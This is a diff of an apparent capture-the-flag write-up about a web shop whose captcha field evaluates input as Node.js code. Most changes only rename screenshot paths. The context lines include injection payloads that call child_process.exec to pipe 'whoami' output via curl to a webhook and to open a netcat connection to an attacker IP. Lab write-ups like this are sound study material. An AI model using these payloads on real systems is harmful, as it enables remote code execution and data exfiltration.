@@ -2,33 +2,33 @@
 
 We start off by scanning network:
 
-<figure><img src="../../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>
 
 On port 500 we find this website:
 
-<figure><img src="../../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 I try to log in as admin with admin:admin
 
-<figure><img src="../../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>
 
 Interesting error message maybe we can enumerate usernames by bruteforcing
 
 But first i register and login with admin:admin and i add an item to my cart and go to checkout:
 
-<figure><img src="../../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>
 
 This is a pretty obvious foothold direction so i enter everything and capture the request with burp:
 
-<figure><img src="../../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (4) (1).png" alt=""><figcaption></figcaption></figure>
 
 The only error i manage to pop is when i input a string in the captcha:
 
-<figure><img src="../../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (5) (1).png" alt=""><figcaption></figcaption></figure>
 
 So while looking up at the error:
 
-<figure><img src="../../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (6) (1).png" alt=""><figcaption></figcaption></figure>
 
 We see that it treats our input as code and does not find the variable so i need a way to call a function that is defined:
 
@@ -42,7 +42,7 @@ require('child_process').exec("whoami | curl -X POST -d @- http://ton-webhook.co
 
 Ok so i got stuck here for a bit, the webserver only allows requests on port 80:
 
-<figure><img src="../../../.gitbook/assets/image (7).png" alt=""><figcaption><p>require('child_process').exec('nc+192.168.49.59+80')</p></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (7) (1).png" alt=""><figcaption><p>require('child_process').exec('nc+192.168.49.59+80')</p></figcaption></figure>
 
 The requests work on port 80 and 443 but is blocked anywhere else, after looking it up the target system or its network might have outbound filtering that **only allows traffic on ports 80 and 443**.
 
